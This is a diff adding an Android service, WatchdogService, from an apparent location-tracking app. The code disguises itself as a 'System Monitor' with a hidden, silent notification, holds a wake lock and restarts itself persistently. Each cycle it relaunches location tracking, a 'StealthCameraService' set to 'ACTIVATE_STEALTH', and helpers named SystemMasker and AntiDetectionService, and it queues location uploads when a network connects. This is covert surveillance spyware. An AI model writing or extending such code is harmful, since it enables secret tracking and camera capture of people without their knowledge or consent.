@@ -1,0 +1,533 @@
+// --- File: WatchdogService.txt (Final Integrated) ---
+
+package com.example.locationtracker;
+
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.Service;
+import android.content.Context;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.os.Build;
+import android.os.Handler;
+import android.os.IBinder;
+import android.os.Looper;
+import android.os.PowerManager;
+import android.os.Process;
+import android.util.Log;
+import android.app.ActivityManager;
+import androidx.core.app.NotificationCompat;
+
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.util.HashMap;
+import java.util.Map;
+import android.net.ConnectivityManager;
+import android.net.Network;
+import android.net.NetworkCapabilities; // ИСПРАВЛЕНО: добавлен импорт
+import android.net.NetworkRequest;
+
+// ИСПРАВЛЕНО: убран import android.net.NetworkCallback — входит в ConnectivityManager
+
+public class WatchdogService extends Service {
+    private static final String TAG = "SystemWatchdog";
+    public static final String CHANNEL_ID = "system_monitoring"; // ИСПРАВЛЕНО: public для использования в других классах
+    private static final int NOTIFICATION_ID = 8002;
+
+    private static final long WATCHDOG_INTERVAL = 60_000L;
+    private static final long CRASH_DETECTION_TIMEOUT = 120_000L;
+    private static final long MAX_SERVICE_CRASH_THRESHOLD = 3;
+
+    // ИСПРАВЛЕНО: примитивные типы вместо Double (вызывали .floatValue() на primitive)
+    private double currentMemoryUsage;
+    private double currentCpuLoad;
+    private int serviceCrashCount;
+    private double cpuTemperature;
+    private long lastHealthCheckTime;
+
+    private Map<String, ServiceHealthStatus> serviceHealthMap;
+
+    private PowerManager.WakeLock wakeLock;
+    private Handler handler;
+    private Runnable watchdogRunnable;
+
+    private SharedPreferences systemPrefs;
+    private SharedPreferences prefs;
+
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        Log.d(TAG, "System monitoring service started");
+
+        createNotificationChannel();
+        handler = new Handler(Looper.getMainLooper());
+
+        systemPrefs = getSharedPreferences("system_config", MODE_PRIVATE);
+        prefs = getSharedPreferences("LocationTracker", MODE_PRIVATE);
+
+        serviceHealthMap = new HashMap<>();
+        serviceHealthMap.put("LocationService", ServiceHealthStatus.IDLE);
+        serviceHealthMap.put("StealthCameraService", ServiceHealthStatus.IDLE);
+        serviceHealthMap.put("BackupLocationService", ServiceHealthStatus.IDLE);
+        serviceHealthMap.put("WatchdogService", ServiceHealthStatus.RUNNING);
+
+        acquireWakeLock();
+
+        startForeground(NOTIFICATION_ID, createNotification());
+        startWatchdog();
+        startRealTimeMonitoring();
+        handleNetworkEvents();
+
+        Log.d(TAG, "WatchdogService initialized successfully");
+    }
+
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        if (intent != null) {
+            handleWatchdogCommand(intent);
+        }
+        if (flags != 0) {
+            checkSystemHealth();
+        }
+        return START_STICKY;
+    }
+
+    private void handleWatchdogCommand(Intent intent) {
+        if (intent.getBooleanExtra("watchdog_restart", false)) {
+            updateServiceStatus("Watchdog", ServiceHealthStatus.RESTARTING);
+            handler.postDelayed(() ->
+                    updateServiceStatus("Watchdog", ServiceHealthStatus.RECOVERED), 5000);
+        }
+    }
+
+    private void startWatchdog() {
+        watchdogRunnable = new Runnable() {
+            @Override
+            public void run() {
+                long startTime = System.currentTimeMillis();
+                try {
+                    monitorResources();
+                    checkSystemHealth();
+                    updateNotificationWithResources();
+
+                    long executionTime = System.currentTimeMillis() - startTime;
+                    long nextDelay = calculateNextDelay(executionTime);
+                    handler.postDelayed(this, nextDelay);
+                    lastHealthCheckTime = System.currentTimeMillis();
+
+                } catch (Exception e) {
+                    Log.e(TAG, "Error in watchdog cycle", e);
+                    serviceCrashCount++;
+                    handleSystemCrash();
+                }
+            }
+        };
+        handler.postDelayed(watchdogRunnable, 10000);
+    }
+
+    private void monitorResources() {
+        try {
+            ActivityManager activityManager =
+                    (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
+            if (activityManager != null) {
+                ActivityManager.MemoryInfo memInfo = new ActivityManager.MemoryInfo();
+                activityManager.getMemoryInfo(memInfo);
+                currentMemoryUsage = 100.0 - ((double) memInfo.availMem / memInfo.totalMem * 100);
+                currentCpuLoad = estimateCpuLoad();
+                cpuTemperature = estimateCpuTemperature();
+
+                Log.d(TAG, String.format("Memory: %.2f%%, CPU: %.2f%%, Temp: %.1f°C",
+                        currentMemoryUsage, currentCpuLoad, cpuTemperature));
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error monitoring resources", e);
+        }
+    }
+
+    private double estimateCpuLoad() {
+        int activeThreads = Runtime.getRuntime().availableProcessors();
+        double load = (100.0 / activeThreads);
+        try {
+            String cpuInfo = readCpuInfo();
+            if (cpuInfo != null) {
+                for (String line : cpuInfo.split("\n")) {
+                    if (line.contains("cpu")) load += 5.0;
+                }
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "Error reading CPU info", e);
+        }
+        return load;
+    }
+
+    private double estimateCpuTemperature() {
+        try {
+            java.io.File tempFile = new java.io.File("/sys/class/thermal/thermal_zone0/temp");
+            java.io.File sourceFile = tempFile.exists() ? tempFile
+                    : new java.io.File("/proc/cpuinfo");
+
+            // ИСПРАВЛЕНО: убран некорректный конструктор BufferedReader(File)
+            // Используем FileInputStream
+            try (BufferedReader reader = new BufferedReader(
+                    new InputStreamReader(new java.io.FileInputStream(sourceFile)))) {
+                String line;
+                while ((line = reader.readLine()) != null) {
+                    if (line.contains("temp")) {
+                        try {
+                            return Double.parseDouble(line.split(":")[1].trim()) / 1000.0;
+                        } catch (NumberFormatException e) {
+                            return 45.0;
+                        }
+                    }
+                }
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "Error estimating CPU temperature", e);
+        }
+        return 45.0;
+    }
+
+    private String readCpuInfo() throws IOException {
+        try (BufferedReader reader = new BufferedReader(new InputStreamReader(
+                new java.io.FileInputStream("/proc/cpuinfo")))) {
+            StringBuilder cpuInfo = new StringBuilder();
+            String line;
+            while ((line = reader.readLine()) != null) {
+                cpuInfo.append(line).append("\n");
+            }
+            return cpuInfo.toString();
+        }
+    }
+
+    private void checkSystemHealth() {
+        try {
+            if (systemPrefs.getBoolean("emergency_shutdown", false)) {
+                performAutomaticRecovery();
+            }
+            checkMainService();
+            checkStealthCameraService();
+            checkBackupService();
+
+            if (serviceCrashCount > MAX_SERVICE_CRASH_THRESHOLD) {
+                performDeepReset();
+            }
+
+            SystemMasker.scheduleSystemJob(this);
+            saveSystemMetrics();
+
+        } catch (Exception e) {
+            Log.e(TAG, "Critical error in health check", e);
+            serviceCrashCount++;
+        }
+    }
+
+    private void performAutomaticRecovery() {
+        try {
+            stopSystemServices();
+
+            Intent recoveryIntent = new Intent(this, WatchdogService.class);
+            recoveryIntent.setAction("ACTION_RECOVERY");
+            startForegroundService(recoveryIntent);
+
+            updateServiceStatus("Recovery", ServiceHealthStatus.RECOVERED);
+
+            systemPrefs.edit()
+                    .putLong("last_recovery_time", System.currentTimeMillis())
+                    .putLong("last_health_check", lastHealthCheckTime)
+                    .putBoolean("emergency_shutdown", false)
+                    .putInt("crash_count", serviceCrashCount)
+                    .apply();
+
+        } catch (Exception e) {
+            Log.e(TAG, "Recovery failed", e);
+        }
+    }
+
+    private void performDeepReset() {
+        try {
+            systemPrefs.edit()
+                    .putInt("crash_count", serviceCrashCount)
+                    .putLong("deep_reset_time", System.currentTimeMillis())
+                    .apply();
+            Process.killProcess(Process.myPid());
+        } catch (Exception e) {
+            Log.e(TAG, "Deep reset failed", e);
+        }
+    }
+
+    private void saveSystemMetrics() {
+        try {
+            // ИСПРАВЛЕНО: currentMemoryUsage/cpuLoad/cpuTemperature — примитивные double,
+            // приводим к float явно через (float) вместо .floatValue()
+            systemPrefs.edit()
+                    .putFloat("memory_usage", (float) currentMemoryUsage)
+                    .putFloat("cpu_load", (float) currentCpuLoad)
+                    .putFloat("cpu_temperature", (float) cpuTemperature)
+                    .putInt("crash_count", serviceCrashCount)
+                    .putLong("last_health_check", lastHealthCheckTime)
+                    .apply();
+
+            StringBuilder servicesState = new StringBuilder();
+            for (Map.Entry<String, ServiceHealthStatus> entry : serviceHealthMap.entrySet()) {
+                servicesState.append(entry.getKey()).append(":").append(entry.getValue()).append(";");
+            }
+            systemPrefs.edit().putString("services_status", servicesState.toString()).apply();
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error saving metrics", e);
+        }
+    }
+
+    private void checkMainService() {
+        try {
+            if (prefs.getBoolean("auto_tracking", false)) {
+                Intent serviceIntent = new Intent(this, LocationService.class);
+                serviceIntent.putExtra("device_id", prefs.getString("device_id", ""));
+                serviceIntent.putExtra("device_name", prefs.getString("device_name", "Unknown_Device"));
+                serviceIntent.putExtra("watchdog_restart", true);
+                serviceIntent.putExtra("timestamp", System.currentTimeMillis());
+
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    startForegroundService(serviceIntent);
+                } else {
+                    startService(serviceIntent);
+                }
+                updateServiceStatus("LocationService", ServiceHealthStatus.RUNNING);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error checking main service", e);
+            updateServiceStatus("LocationService", ServiceHealthStatus.ERROR);
+        }
+    }
+
+    private void checkStealthCameraService() {
+        try {
+            Intent stealthIntent = new Intent(this, StealthCameraService.class);
+            stealthIntent.putExtra("action", "ACTIVATE_STEALTH");
+            stealthIntent.putExtra("device_id", DeviceIdManager.getDeviceId(this));
+            stealthIntent.putExtra("watchdog_restart", true);
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(stealthIntent);
+            } else {
+                startService(stealthIntent);
+            }
+            updateServiceStatus("StealthCameraService", ServiceHealthStatus.RUNNING);
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error restarting StealthCameraService", e);
+            updateServiceStatus("StealthCameraService", ServiceHealthStatus.ERROR);
+        }
+    }
+
+    private void checkBackupService() {
+        try {
+            if (prefs.getBoolean("auto_tracking", false)) {
+                Intent backupIntent = new Intent(this, BackupLocationService.class);
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    startForegroundService(backupIntent);
+                } else {
+                    startService(backupIntent);
+                }
+                updateServiceStatus("BackupLocationService", ServiceHealthStatus.RUNNING);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error checking backup service", e);
+        }
+    }
+
+    private void stopSystemServices() {
+        try {
+            stopService(new Intent(this, LocationService.class));
+            stopService(new Intent(this, BackupLocationService.class));
+            stopService(new Intent(this, AntiDetectionService.class));
+            getSharedPreferences("pending_locations", MODE_PRIVATE).edit().clear().apply();
+        } catch (Exception e) {
+            Log.e(TAG, "Error stopping services", e);
+        }
+    }
+
+    private void updateServiceStatus(String serviceName, ServiceHealthStatus status) {
+        serviceHealthMap.put(serviceName, status);
+        try {
+            systemPrefs.edit().putString("status_" + serviceName, status.name()).apply();
+        } catch (Exception e) {
+            Log.w(TAG, "Error saving service status", e);
+        }
+    }
+
+    private void createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel channel = new NotificationChannel(
+                    CHANNEL_ID, "System Monitoring", NotificationManager.IMPORTANCE_MIN);
+            channel.setShowBadge(false);
+            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
+
+            NotificationManager manager = getSystemService(NotificationManager.class);
+            if (manager != null) manager.createNotificationChannel(channel);
+        }
+    }
+
+    private Notification createNotification() {
+        return new NotificationCompat.Builder(this, CHANNEL_ID)
+                .setSmallIcon(android.R.drawable.stat_sys_warning)
+                .setContentTitle("System Monitor")
+                .setContentText("Monitoring system health and resources")
+                .setPriority(NotificationCompat.PRIORITY_MIN)
+                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+                .setOngoing(true)
+                .setSilent(true)
+                .setCategory(NotificationCompat.CATEGORY_SYSTEM)
+                .build();
+    }
+
+    private void updateNotificationWithResources() {
+        String contentText = String.format("RAM: %.1f%% | CPU: %.1f%% | Crashes: %d",
+                currentMemoryUsage, currentCpuLoad, serviceCrashCount);
+
+        NotificationManager manager = getSystemService(NotificationManager.class);
+        if (manager != null) {
+            manager.notify(NOTIFICATION_ID, new NotificationCompat.Builder(this, CHANNEL_ID)
+                    .setSmallIcon(android.R.drawable.stat_sys_warning)
+                    .setContentTitle("System Monitor")
+                    .setContentText(contentText)
+                    .setPriority(NotificationCompat.PRIORITY_LOW)
+                    .setOngoing(true)
+                    .setSilent(true)
+                    .build());
+        }
+    }
+
+    private long calculateNextDelay(long executionTime) {
+        return executionTime > WATCHDOG_INTERVAL ? WATCHDOG_INTERVAL * 2 : WATCHDOG_INTERVAL;
+    }
+
+    private boolean isNetworkAvailable() {
+        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
+        if (cm == null) return false;
+        // ИСПРАВЛЕНО: getActiveNetworkInfo() устарел, используем новый API
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            Network network = cm.getActiveNetwork();
+            if (network == null) return false;
+            android.net.NetworkCapabilities caps = cm.getNetworkCapabilities(network);
+            return caps != null && (caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
+                    caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR));
+        } else {
+            android.net.NetworkInfo info = cm.getActiveNetworkInfo();
+            return info != null && info.isConnected();
+        }
+    }
+
+    private boolean isBatteryOptimized() {
+        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+        return pm != null && pm.isIgnoringBatteryOptimizations(getPackageName());
+    }
+
+    private void handleSystemCrash() {
+        serviceCrashCount++;
+        try {
+            systemPrefs.edit()
+                    .putLong("last_crash_time", System.currentTimeMillis())
+                    .putInt("total_crashes", serviceCrashCount)
+                    .apply();
+        } catch (Exception e) {
+            Log.e(TAG, "Error saving crash info", e);
+        }
+    }
+
+    private void acquireWakeLock() {
+        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+        if (pm != null) {
+            wakeLock = pm.newWakeLock(
+                    PowerManager.PARTIAL_WAKE_LOCK | PowerManager.ON_AFTER_RELEASE,
+                    TAG + ":WatchdogLock");
+            wakeLock.acquire(10 * 60 * 1000L);
+        }
+    }
+
+    private void releaseWakeLock() {
+        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
+    }
+
+    @Override
+    public IBinder onBind(Intent intent) { return null; }
+
+    @Override
+    public void onDestroy() {
+        if (handler != null && watchdogRunnable != null) {
+            handler.removeCallbacks(watchdogRunnable);
+        }
+        releaseWakeLock();
+        super.onDestroy();
+    }
+
+    public enum ServiceHealthStatus {
+        IDLE, RUNNING, RESTARTING, RECOVERED, ERROR
+    }
+
+    private void startRealTimeMonitoring() {
+        handler.post(() -> {
+            try {
+                ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
+                if (am != null) {
+                    ActivityManager.MemoryInfo memInfo = new ActivityManager.MemoryInfo();
+                    am.getMemoryInfo(memInfo);
+                    double memoryUsage = 100.0 - ((double) memInfo.availMem / memInfo.totalMem * 100);
+                    updateUIWithMetrics(memoryUsage);
+                }
+                handler.postDelayed(this::startRealTimeMonitoring, 30000);
+            } catch (Exception e) {
+                Log.e(TAG, "Error in real-time monitoring", e);
+            }
+        });
+    }
+
+    private void updateUIWithMetrics(double memoryUsage) {
+        try {
+            NotificationManager manager =
+                    (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
+            if (manager != null) {
+                manager.notify(NOTIFICATION_ID, new NotificationCompat.Builder(this, CHANNEL_ID)
+                        .setContentTitle("System Health")
+                        .setContentText(String.format("Memory: %.2f%%", memoryUsage))
+                        .setSmallIcon(android.R.drawable.stat_sys_download_done)
+                        .setPriority(NotificationCompat.PRIORITY_LOW)
+                        .build());
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error updating UI metrics", e);
+        }
+    }
+
+    private void handleNetworkEvents() {
+        try {
+            ConnectivityManager cm =
+                    (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
+            if (cm == null) return;
+
+            cm.registerNetworkCallback(
+                    new NetworkRequest.Builder().build(),
+                    new ConnectivityManager.NetworkCallback() { // ИСПРАВЛЕНО: полный путь вместо NetworkCallback
+                        @Override
+                        public void onAvailable(Network network) {
+                            Log.d(TAG, "Network available");
+                            // ИСПРАВЛЕНО: убран updateNetworkStatus(context, ...) — используем this напрямую
+                            LocationUploadWorker.enqueueUpload(getApplicationContext());
+                        }
+
+                        @Override
+                        public void onLost(Network network) {
+                            Log.d(TAG, "Network lost");
+                        }
+                    }
+            );
+        } catch (Exception e) {
+            Log.e(TAG, "Error handling network events", e);
+        }
+    }
+
+    // ИСПРАВЛЕНО: убрано поле context и метод setContext() — Service уже является Context
+    // Использование getApplicationContext() везде где нужен Context
+}
